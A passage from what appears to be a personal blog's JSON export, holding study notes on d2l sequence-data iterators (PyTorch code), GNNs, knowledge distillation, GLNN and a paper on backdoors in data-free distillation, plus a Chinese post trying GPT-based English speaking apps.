src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-29%20at%2011.57.50%20AM.png\" alt=\"Screen Shot 2023-03-29 at 11.57.50 AM\"></p>\n<p>In english, the three words phrases are not very common, so we can observe a clear decrese in the result.<br>The following figure is more telling.</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-29%20at%2011.59.09%20AM.png\" alt=\"Screen Shot 2023-03-29 at 11.59.09 AM\"></p>\n<p>We can draw the conclusion frome the figure:<br>1) The n-gram words are approximately obey the Zipf’s law.<br>2) N-gram words are rare. It implys that a lot of inner structrue exsit in the language system which are appropriate to apply deep learning model to describe.</p>\n<h2><span id=\"254-read-long-sequence-data\">25.4 Read Long Sequence Data</span></h2><p>Review the solution we have learned last course.<br>If we want to build the language model by using the datas,may be we wanto use some datas repeatly, because the Markov model.<br>But it is so expensive to use the data repeatly, we need to inherit the idea of mini-batch, try to cut the dataset into several mini-batchs to guarrantee each datas only be used for one times.<br>So there are two technologies to solve the problem.</p>\n<h3><span id=\"2541-random-sampling\">25.4.1 Random Sampling</span></h3><p>corpus: the original sequence<br>num steps : T<br>batch_size : </p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">seq_data_iter_random</span>(<span class=\"params\">corpus, batch_size, num_steps</span>):</span>  <span class=\"comment\">#@save</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;使用随机抽样生成一个小批量子序列&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"comment\"># 1</span></span><br><span class=\"line\">    <span class=\"comment\"># 设每个小批量长度为T，在开始时从0-T中随机选取一个值作为小批量的起始下标</span></span><br><span class=\"line\">    <span class=\"comment\"># 例如rand = 4，则该小批量为第4 至第T+4个元素</span></span><br><span class=\"line\">    <span class=\"comment\"># 减去1，是因为我们需要考虑标签</span></span><br><span class=\"line\">    <span class=\"comment\"># 规定小批量的取值范围之后，将标签小于该随机数的数据全部丢弃</span></span><br><span class=\"line\">    corpus = corpus[random.randint(<span class=\"number\">0</span>, num_steps - <span class=\"number\">1</span>):]</span><br><span class=\"line\">\t<span class=\"comment\"># 2</span></span><br><span class=\"line\">\t<span class=\"comment\"># 计算新生成的小批量的步长，即新的语料库中有多少个小批量子序列</span></span><br><span class=\"line\">    num_subseqs = (<span class=\"built_in\">len</span>(corpus) - <span class=\"number\">1</span>) // num_steps</span><br><span class=\"line\">    <span class=\"comment\"># 3</span></span><br><span class=\"line\">    <span class=\"comment\"># 生成以0为起始下标，步长为原序列步长，总长为原序列总长的列表。</span></span><br><span class=\"line\">    <span class=\"comment\"># 即以新的子序列数重新索引序列列表</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    initial_indices = <span class=\"built_in\">list</span>(<span class=\"built_in\">range</span>(<span class=\"number\">0</span>, num_subseqs * num_steps, num_steps))</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 4</span></span><br><span class=\"line\">    <span class=\"comment\"># 在随机抽样的迭代过程中，</span></span><br><span class=\"line\">    <span class=\"comment\"># 来自两个相邻的、随机的、小批量中的子序列不一定在原始序列上相邻</span></span><br><span class=\"line\">    random.shuffle(initial_indices)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">data</span>(<span class=\"params\">pos</span>):</span></span><br><span class=\"line\">        <span class=\"comment\"># 返回从pos位置开始的长度为num_steps的序列</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> corpus[pos: pos + num_steps]</span><br><span class=\"line\"></span><br><span class=\"line\">    num_batches = num_subseqs // batch_size</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, batch_size * num_batches, batch_size):</span><br><span class=\"line\">        <span class=\"comment\"># 在这里，initial_indices包含子序列的随机起始索引</span></span><br><span class=\"line\">        initial_indices_per_batch = initial_indices[i: i + batch_size]</span><br><span class=\"line\">        X = [data(j) <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> initial_indices_per_batch]</span><br><span class=\"line\">        Y = [data(j + <span class=\"number\">1</span>) <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> initial_indices_per_batch]</span><br><span class=\"line\">        <span class=\"keyword\">yield</span> torch.tensor(X), torch.tensor(Y)</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-29%20at%205.37.57%20PM.png\" alt=\"Screen Shot 2023-03-29 at 5.37.57 PM\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-29%20at%206.11.43%20PM.png\" alt=\"Screen Shot 2023-03-29 at 6.11.43 PM\"></p>\n<p>Analyze the above code and reslut:<br>We generate the sequence with 35 length, so for each batch , it contains 5 elements.<br>So the steps are as follows:<br>1) Using the total length 35 and each subsequence ‘s length 5 to  work out the numbers of subsequence : 35-1 / 5 = 6 …4<br>2) Mini-batch’s size is 2, so we can gain 3 mini-batch, and each batch contains 2 subsequence.</p>\n<h3><span id=\"2542-sequential-partitioning\">25.4.2 Sequential Partitioning</span></h3><p>Random sampling render the adjacent mini-batch become random,  and the method of sequential partitioning , in opposite, can keep the adjacent mini-batch also adjacent in the original sequence.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">seq_data_iter_sequential</span>(<span class=\"params\">corpus, batch_size, num_steps</span>):</span>  <span class=\"comment\">#@save</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;使用顺序分区生成一个小批量子序列&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"comment\"># Generate the ramdom offset  </span></span><br><span class=\"line\">    offset = random.randint(<span class=\"number\">0</span>, num_steps)</span><br><span class=\"line\">    <span class=\"comment\"># the rest corpus / batch size = batch num ,batch num * batch size = new corpus length </span></span><br><span class=\"line\">    num_tokens = ((<span class=\"built_in\">len</span>(corpus) - offset - <span class=\"number\">1</span>) // batch_size) * batch_size</span><br><span class=\"line\">\t</span><br><span class=\"line\">    Xs = torch.tensor(corpus[offset: offset + num_tokens])</span><br><span class=\"line\">    Ys = torch.tensor(corpus[offset + <span class=\"number\">1</span>: offset + <span class=\"number\">1</span> + num_tokens])</span><br><span class=\"line\">    Xs, Ys = Xs.reshape(batch_size, -<span class=\"number\">1</span>), Ys.reshape(batch_size, -<span class=\"number\">1</span>)</span><br><span class=\"line\">    num_batches = Xs.shape[<span class=\"number\">1</span>] // num_steps</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, num_steps * num_batches, num_steps):</span><br><span class=\"line\">        X = Xs[:, i: i + num_steps]</span><br><span class=\"line\">        Y = Ys[:, i: i + num_steps]</span><br><span class=\"line\">        <span class=\"keyword\">yield</span> X, Y</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-29%20at%207.59.45%20PM.png\" alt=\"Screen Shot 2023-03-29 at 7.59.45 PM\"></p>\n","categories":["ML"],"tags":["d2l"]},{"title":"GPT+speaking 胡说八道测评","url":"/2023/04/25/EN_GPT+speaking%20%E8%83%A1%E8%AF%B4%E5%85%AB%E9%81%93%E6%B5%8B%E8%AF%84/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>奇怪的一篇，但是确实花费了我一个早上（还没有成功）</p>\n<h2><span id=\"openai-key\">OpenAI key</span></h2><p>首先不管是什么封装软件，拥有一个open ai key是基础。毕竟这东西这么贵，也没有那么多慈善家愿意用自己的key来服务大众。<br>获取key的三种思路</p>\n<h3><span id=\"嫖免费额度\">嫖免费额度</span></h3><p>理论上正常注册都会送五美金额度，但是我用的谷歌登陆就没有这个额度，反正随缘，等我这个号的额度没有了来试一下。</p>\n<h3><span id=\"自己办卡买\">自己办卡买</span></h3><p>建议所有富哥直接用虚拟信用卡用自己的号购买。<br>目前看到的虚拟信用卡平台<br><a href=\"https://www.vvacard.com\">https://www.vvacard.com</a><br>很贵，每单要收百分之五的手续费，办卡五美元一张，充值金额最小也是50美金。。<br><strong>但是有钱的话应该无所畏惧吧（</strong></p>\n<h3><span id=\"买成品号\">买成品号</span></h3><p>穷人（我）的选择，不知道为什么我用的第三方（谷歌）登陆，所以key那边居然没有免费的额度。。就只能去tb花十块买了个只有五美金额度的成品号（哎，商家真是血赚）。五美金也用不了多久，chatgpt3.5 ，1k的token是0.002美刀<br>我早上就对着gpt说了几句话，刚才整了个autogpt玩了几分钟就花了一分钱。五美金能撑一个月就不错了。不过这个好在可以不停注册新账号。<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-04-25%20at%204.50.32%20PM.png\" alt=\"Screen Shot 2023-04-25 at 4.50.32 PM\"></p>\n<h2><span id=\"langhelper\">LangHelper</span></h2><p>b站教程视频<br><a href=\"https://www.bilibili.com/video/BV1Ch41137en/?spm_id_from=..top_right_bar_window_custom_collection.content.click&amp;vd_source=b424d92c840f16ffa9a14a3d99dfc564\">https://www.bilibili.com/video/BV1Ch41137en/?spm_id_from=..top_right_bar_window_custom_collection.content.click&amp;vd_source=b424d92c840f16ffa9a14a3d99dfc564</a><br>github：<br><a href=\"https://github.com/NsLearning/LangHelper\">https://github.com/NsLearning/LangHelper</a></p>\n<p>目前只支持Windows。他其实还是用了【<a href=\"https://github.com/lencx/ChatGPT】（或者类似）的项目，（应该就是这个，我看大小都一样），用一个图形化软件把chatgpt封装，然后在此基础上进行微调。\">https://github.com/lencx/ChatGPT】（或者类似）的项目，（应该就是这个，我看大小都一样），用一个图形化软件把chatgpt封装，然后在此基础上进行微调。</a><br>这个程序的核心在于这个LangHelper。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-04-25%20at%204.58.46%20PM.png\" alt=\"Screen Shot 2023-04-25 at 4.58.46 PM\"></p>\n<h3><span id=\"安装\">安装</span></h3><p>用一台纯得不能再纯的win7系统来测试。（打开的时候pd还过期了，学生半价还不能用支付宝支付，干脆花两分钟搞了盗版，三年pd正版用户就是这样被迫害的）<br>1） 科学上网<br>2） open ai api key<br>然后把软件提供的所有东西下载下来</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-04-25%20at%205.01.03%20PM.png\" alt=\"Screen Shot 2023-04-25 at 5.01.03 PM\"><br>Up说要安装这个x86的版本，我是没搞太懂，他自己也解释不清楚，反正我装的x86也许能用。<br>解压zip过后。<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-04-25%20at%205.02.13%20PM.png\" alt=\"Screen Shot 2023-04-25 at 5.02.13 PM\"></p>\n<p>这个时候按照up的话就是打开ChatGPT和LangHelper中的LangHelper程序。但是早上我打开ChatGPT的时候报错，就是那个advapi32.dll丢失。<br>有这个错的话需要安装补丁包，64位是：<br><a href=\"https://www.microsoft.com/en-us/download/details.aspx?id=48636。\">https://www.microsoft.com/en-us/download/details.aspx?id=48636。</a><br>32的话懒得找链接了，网上搜报错信息对应的解答贴给出的链接就是32位的。<br>把dll扔进sysWOW64，重启就可以了。具体报错的原因我也懒得查证了，估计就是我现在在用的软件太高级了，需要严格遵循什么安全规定或者协议，但是我的软件版本太低了所以需要打补丁。<br>然后找到LangHelper，这里我也没有打开成功，也是报错，少dll，把对应的dll下载下来丢进系统文件夹以后，程序倒是可以打开了，但是秒闪退。</p>\n<p>没有耐心整这个了我估计还是我的win版本太低了，不过其实这个langhelper主要是针对改善chat酱的语音，所以凑合用用其实也没关系，我的需求就是语音识别和实时对话，基本都可以满足。<br>并且可以对模型进行微调，比如给他一个tofel问题的模板以及评分标准之类的。<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-04-25%20at%205.30.13%20PM.png\" alt=\"Screen Shot 2023-04-25 at 5.30.13 PM\"></p>\n<h2><span id=\"polyglot\">polyglot</span></h2><p>一个非常简单上手的支持mac的实时对话软件，封装得很严实，登陆账号就可以用，功能相对不多，目前没有微调功能。<br>目前的话还是这个比较好用，但是咩有微调，不过也好办，将喂的文本记录就行了。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-04-25%20at%205.33.49%20PM.png\" alt=\"Screen Shot 2023-04-25 at 5.33.49 PM\"></p>\n","categories":["EN"],"tags":["tofel"]},{"title":"GNN Overview","url":"/2023/08/04/GNNs/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n\n    <div id=\"aplayer-SqrvDSoe\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"22693394\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<p>【<a href=\"https://distill.pub/2021/understanding-gnns/】\">https://distill.pub/2021/understanding-gnns/】</a><br>【<a href=\"https://distill.pub/2021/gnn-intro/】\">https://distill.pub/2021/gnn-intro/】</a><br>笔记主要基于以上两篇博客。</p>\n<p>抽象来将图神经网络就是将原本输入的图像也好文本也好用graph结构替代，从而模型网络设计等也要相应进行调整。笔记会从最简单的MLP -〉 CNN -〉 Attention，对应到图神经网络即为 GNN - GCN - GAN。最后会衍生一些知识图谱之类的知识以及一些paper的简单核心提取。</p>\n<h1><span id=\"1-graph-neural-networks\">1 Graph  Neural Networks</span></h1><h2><span id=\"11-why-graph\">1.1 Why Graph</span></h2><p>当我们想利用神经网络同时学习节点的内容，节点与节点之间的关系以及整个系统之间的关系时，很显然简单的文本或者图像很难实现。<br>举几个比较常见的例子，我们想要学习twitter中的特定用户的社交网络模式，其中就有A关注B，B关注C，C关注A，这样就能形成简单的图结构。<br>那么问题在于，只是实现单纯的社交网络结构的话，其实用文本或者图像描述也可以，为什么要大费周章使用图结构呢》<br>这还是因为图的一个重要特征就是图并不存在天然的顺序，如果使用顺序来完整地表达图的话，那么就需要将图分解成所有可能的序列，然后对序列进行建模，很显然这需要极为庞大的计算量。</p>\n<h2><span id=\"12-图的基本介绍\">1.2 图的基本介绍</span></h2><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-08-04%20at%2010.29.35%20PM.png\" alt=\"Screen Shot 2023-08-04 at 10.29.35 PM\"></p>\n<p>从上图我们可以看出图的三个重要组成部分，即节点V，边缘E和全局信息U（例如一共有多少个节点，最长的路径是？）</p>\n<h3><span id=\"有向or无向\">有向or无向</span></h3><p>图被分为有向（undirected edge） 和无向图「directed edge」。<br>![[Screen Shot 2023-08-04 at 10.35.01 PM.png]]<br>但实际上无向图可以看作是两个有向边的结合。</p>\n<h3><span id=\"异质or同质图homogeneous-and-heterogeneous-graphs\">异质or同质图（homogeneous and Heterogeneous Graphs）</span></h3><p>这个概念可以联系高中化学的同分异构体。<br>同质图就是每个节点的种类都是相同的，异质图则是图包含多种不同的节点。</p>\n<h3><span id=\"带有边信息的图graphs-with-edge-information\">带有边信息的图(Graphs with Edge Information)</span></h3><p>此类型的图，每一个边都包含额外的信息，例如边的种类。<br>举个简单的例子 twitter中 A和B的边就可以包含 following unfollow 以及 block。</p>\n<h3><span id=\"对称性symmetric\">对称性（symmetric）</span></h3><p>指的是改变图的排列顺序，图不会被改变。</p>\n<h2><span id=\"13-gnn基本任务\">1.3 GNN基本任务</span></h2><p>即我们需要GNN来做什么。<br>目前大致会将任务分为三类：graph-level, node-level, and edge-level.</p>\n<h3><span id=\"graph-level-task\">Graph-level task</span></h3><p> predict the property of an entire graph.<br> 预测整张图的特性，例如如下的例子，判断哪个图是两个环。<br>![[Screen Shot 2023-08-04 at 11.45.14 PM.png]]</p>\n<h3><span id=\"node-level\">node-level</span></h3><p>判断节点的类型<br>例如判断某个节点与A的互动更多还是与B的互动更多。</p>\n<h3><span id=\"edge-level\">edge-level</span></h3><p>判断边的类型</p>\n<h2><span id=\"14-如何将图运用在神经网络\">1.4 如何将图运用在神经网络</span></h2><p>其实就是如何表示图的三个组成部分的问题。<br>对于节点，边我们都可以用简单的向量来表示，但是如何表示点和边的连接性呢？<br>如果使用领接矩阵，当图的节点比较多时，矩阵会变得尤其大，且很有可能成为稀疏矩阵，此时存储的性价比非常低。<br>同时我们需要保证当点与边的顺序被打乱，其对应的连接性仍然能一一对应，并且不同的顺序并不会改变图本身。<br>我们可以用一种看起来原始的方法，就是维护一个列表，存储每一条边连接的两个节点。<br>![[Screen Shot 2023-08-04 at 11.56.40 PM.png]]<br>这样例如当边的位置顺序被调换，我们只需要相应改变领接列表中数组的顺序即可。</p>\n<h2><span id=\"15-图信息的传播message-propagate\">1.5 图信息的传播（message propagate）</span></h2><p>在正式介绍message passing前，我们先了解一下最简单的GNN的形态。</p>\n<h3><span id=\"无message-passing的gnn\">无message passing的GNN</span></h3><p>这个概念比较简单，就是对于图的三个元素分别放进MLP中更新学习。<br>对于单层的GNN layer包含三个MLP，分别对应顶点，边和全局的MLP。<br>![[Screen Shot 2023-08-05 at 12.20.33 AM.png]]<br>这样处理满足我们之前提到过的不影响图的对称性的同时对图进行更新。</p>\n<h4><span id=\"pooling\">pooling</span></h4><p>即我们可以利用相邻的其他元素来提取某一元素的特征。<br>比如我们需要某个节点的特征，所以我们将相邻的边的信息汇聚，以其作为该节点的特征。</p>\n<h4><span id=\"问题\">问题</span></h4><p>但是这种做法存在一个显而易见的问题，即我们并没有很好地利用图的连接性，图的三个特征似乎是割裂的。就如同三种完全不同的数据分别放进了mlp一样，并不能很好地发挥图的特性。</p>\n<p>信息传递的机制就是为了解决这个问题。</p>\n<h3><span id=\"有message-passing的gnn\">有message passing的GNN</span></h3><p>其实就是沿用了上面讲的pooling的类似概念，我们可以用某一节点的相邻节点通过特定的汇聚方程来提取特征，进而用被汇聚的节点学习。<br>![[Screen Shot 2023-08-05 at 12.30.40 AM.png]]<br>这点和CNN其实比较类似，只不过CNN时用卷积核做卷积运算汇聚，这里的汇聚方式应该是求平均或者相加等。区别在于对与被汇聚的每一个相邻节点其权重都是相同的，而CNN的权重没记错的话应该是被学习的变量。<br>此外还有多种信息传递的方式，比如说先将边的信息传递给顶点，更新后顶点再传递回去，从而实现信息的传递交互，体现图的特性。这里博客列举了多种信息传递的方式，其实原理都类似。<br>并且这个也没有谁高谁低的问题，就是主打一个玄学炼丹。<br>![[Screen Shot 2023-08-05 at 12.38.27 AM.png]]<br>其他的内容俺们放在1.3讲</p>\n<h1><span id=\"2-graph-convolution\">2 Graph Convolution</span></h1><p>这一章涉及到一些图卷积网络的数学原理</p>\n<h2><span id=\"20-preface\">2.0 preface</span></h2><p>很早之前我们学过CNN的概念，即对于图像做卷积—用一个特定大小的卷积核或者说窗口对某个像素及其周围的像素做卷积运算，从而聚合几个像素的特征，保证效果的同时减小了MLP的运算复杂度。<br>还是按照博客的顺序来讲吧。</p>\n<h2><span id=\"21-从cnn到gcn\">2.1 从CNN到GCN</span></h2><p>如果单纯将cnn的概念拓展到GCN的话，会有一个非常明显的问题：<br>CNN的每一次卷积投影的像素位置都是固定的，然而图并没有这个特性，所以如何将位置并不固定的图投影汇聚？</p>\n<h3><span id=\"polynomial-filters-on-graphs\">Polynomial Filters on Graphs</span></h3><p>额，好像目前没有见到官方翻译，多项式滤波器。。？</p>\n<h1><span id=\"3-advanced-gnn\">3 Advanced GNN</span></h1><h2><span id=\"gat\">GAT</span></h2><p>GAT的核心思想是利用注意力机制来捕捉节点之间的关系。在GAT中，每个节点都会对其邻居节点进行”关注”，并根据邻居节点的信息来更新自己的信息。这种”关注”不是平等的，而是有所侧重的。也就是说，每个节点会更加关注与自己更相关或更重要的邻居节点，而对于不太相关或不太重要的邻居节点则关注较少。这种侧重的程度，就是我们所说的”注意力权重”。</p>\n","categories":["ML"],"tags":["GNN"]},{"title":"Knowledge Distillation Overview","url":"/2023/08/14/KD/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n\n    <div id=\"aplayer-mmZDhnWa\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<p>基于三篇比较经典的论文对KD有一个更加深入的认知。<br>-Distilling the Knowledge in a Neural Network</p>\n<h1><span id=\"1-distilling-the-knowledge-in-a-neural-network\">1 Distilling the Knowledge in a Neural Network</span></h1><h2><span id=\"11-abstract\">1.1 Abstract</span></h2><p>提升ml性能的一个方法是整个多个算法求平均，然而当某些模型太大时，由于部署平台算力有限，效率降低。论文提出一种通过知识蒸馏将集成的模型压缩为单个小模型的方法，且该方法在MNIST数据集上取得了惊人的好结果。</p>\n<h2><span id=\"12-具体思想\">1.2 具体思想</span></h2><p>论文实际研究的点在于小模型如何学习大模型的泛化能力。<br>一个明显的方法是学习大模型产生的soft labels，即每项对应的标签概率。当soft lable的熵较大时，其能提供的信息也就越多。<br>所以这里采用的大致流程是，对于某数据集，利用teacher model生成包含更多助于泛化的信息的soft labels，然后用soft labels来训练student model。</p>\n<h1><span id=\"2-data-free-kd\">2 Data-free KD</span></h1><h2><span id=\"21-abstract\">2.1 abstract</span></h2><p>上一片论文提出了KD，但是KD训练学生模型一般是基于能够得到原数据的情况，但有时由于原数据集过大或隐私问题，我们无法获取这些数据，所以这篇论文提出了一种不需要原数据的KD方法。</p>\n<h2><span id=\"22-具体思想\">2.2 具体思想</span></h2><p>输入白噪声，然后使得其不断向activation record收敛以重建original dataset。<br>activation record可以是teacher model分类单元的均值或者方差。</p>\n<p>![[3474085.3475254.pdf]]</p>\n","categories":["ML"],"tags":["GNN"]},{"title":"GLNN","url":"/2023/08/14/ML_GLNN/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-IPTexZEo\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"22693394\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n<h1><span id=\"1-glnn\">1 GLNN</span></h1><p>通过 KD将GNN与MLP结合，突破 data dependency造成的性能局限性。</p>\n<h2><span id=\"11-introduction\">1.1 introduction</span></h2><p>对于大型工业应用来说，MLP依然占主导地位。因为GNN存在的data dependency会导致干扰而使得其难以利用于latency-constrained applications（就是需要低延迟的应用）。<br>因此克服GNN的data dependency至关重要。<br>论文考虑了MLP不受data dependency的限制与GNN的特性，结合两者的特点，通过对Knowledge Graph进行distill，从而改善GNN的latency问题。<br>即“bridge the two worlds, enjoying the low-latency, dependency-free nature of MLPs and the graph context-awareness of GNNs at the same time”<br>同时结合MLP和GNN的优点。</p>\n<h3><span id=\"111-present-work\">1.1.1 Present work</span></h3><p>如何结合？论文给出的关键思路是将原本对时间非常敏感的模型训练步骤转变为对时间不不敏感的less time-sensitive training step（通常多小时或者天的延迟也是可以接受的），即“Graph-less Neural Network（GLNN）”<br>用KD的话解释就是KD from a GNN teacher to a student MLP。<br>论文的结果是无论是从时间还是表现上来看，GLNN都优于一般的GNN以及MLP。</p>\n<h2><span id=\"12-related-work\">1.2 related work</span></h2><p>GNN<br>Inference Acceleration.<br>GNN distillation.</p>\n<h2><span id=\"13-glnn框架\">1.3 GLNN框架</span></h2><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-08-14%20at%208.55.52%20AM.png\" alt=\"Screen Shot 2023-08-14 at 8.55.52 AM\"><br>线下利用teacher GNN训练一个student MLP，记为GLNN，线上部署GLNN，对新features进行预测。<br>具体则是仅仅考虑input graph的node feature，用这些node features训练一个MLP，而teacher model的soft target作为辅助。<br>从如下loss方程中也可以看出训练实际是用hard target+soft target训练一个MLP，其中用参数$\\lambda$来衡量soft 和 hard的倾向性。</p>\n<script type=\"math/tex; mode=display\">\nL = λΣ_{v∈V}L_{label}(\\hat{y}_{v},y_{v})+(1−λ)Σ_{v∈V}L_teacher(\\hat{y}_{v},z_{v})</script><h2><span id=\"14-实现amp评估amp问题\">1.4 实现&amp;评估&amp;问题</span></h2><h3><span id=\"141-如何将glnn与mlp或gnn比较\">1.4.1  如何将GLNN与MLP或GNN比较</span></h3><p>相同的层数以及隐藏层，比较最后的结果</p>\n<h3><span id=\"142-can-glnns-work-well-under-both-transductive-and-inductive-settings\">1.4.2 CAN GLNNS WORK WELL UNDER BOTH TRANSDUCTIVE AND INDUCTIVE SETTINGS</span></h3><ul>\n<li><strong>Transductive Learning</strong>: The entire graph is known during training, and the task is to predict labels for specific unseen nodes within that known graph.</li>\n<li><strong>Inductive Learning</strong>: The model is trained to generalize to entirely new graphs or unseen parts of the graph, learning from one or more graphs to make predictions on entirely different instances.<h3><span id=\"143-对比其他方法\">1.4.3 对比其他方法</span></h3><h4><span id=\"pruning-and-quantization\">pruning and quantization</span></h4>减少模型参数，以及MAC操作，但是并没有消除neighbor-fetching latency.，因此速度仍然比不上MLP。<h4><span id=\"neighbor-sampling\">neighbor sampling</span></h4>实现量化比较，证明GLNN更好</li>\n</ul>\n","categories":["ML"],"tags":["paper notes"]},{"title":"Poisoned_KD","url":"/2023/08/14/ML_Poisoned_KD/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-QVrlJWWR\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n<h1><span id=\"2-revisiting-data-free-knowledge-distillation-with-poisoned-teachers\">2 Revisiting Data-Free Knowledge Distillation with Poisoned Teachers</span></h1><h2><span id=\"21-abstract\">2.1 abstract</span></h2><p>Data-free KD能够使得我们在没有net-t data的情况下蒸馏net-s，但其中预训练的net-t安全性有待商榷。论文讨论了data-free KD的安全性，并提出了Anti-Backdoor Data-Free KD。</p>\n<h2><span id=\"22-introduction\">2.2 introduction</span></h2><p>Data-free KD技术使得net-t 原始训练数据受保护情况下的应用成为可能，但其中包含的安全问题不容小觑：student能否信任不可信teacher的迁移知识？例如当预训练teacher模型本身的训练数据就是被污染或未清洁时。<br>如果net-t被污染的话，net-s很可能在没有使用原始数据的情况下继承这种污染，并反映出与net-t相同的表现。例如如果net-t留有backdoor，那么net-s很可能也会通过distill学习到这个backdoor。<br>论文首先通过测试10 backdoor attacks下data- free backdoor transfer的情况。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-08-13%20at%2011.55.43%20PM.png\" alt=\"Screen Shot 2023-08-13 at 11.55.43 PM\"></p>\n<p>上图示意了研究结果，研究基于CIFAR-10数据集，分别用对受污染的teacher模型分别使用Vanilla KD（需要使用原数据）和data-free KD（不使用原数据）训练student，右边的图表示两种训练方法下对于backdoor的触发概率，可以看到data-free KD训练student远高于Vanilla KD。<br>针对于以上存在的问题，论文提出了一种Anti-Backdoor Data- Free KD（ABD），主要思想是：1. Shuffling Vaccine 目前没看明白 2.Student Self-Retrospection，就是合成提取出backdoor知识并过滤（unlearn acquired malicious knowledge）</p>\n<h3><span id=\"贡献\">贡献</span></h3><ol>\n<li>首次分析实验data-free KD 基于untrusted teacher model的安全问题。</li>\n<li>定义了backdoor从net-t传递到net-s的两个潜在原因。</li>\n<li>提出ABD，并验证效果</li>\n</ol>\n<h2><span id=\"23-data-free-can-steam-security-risks\">2.3 Data-Free Can Steam Security 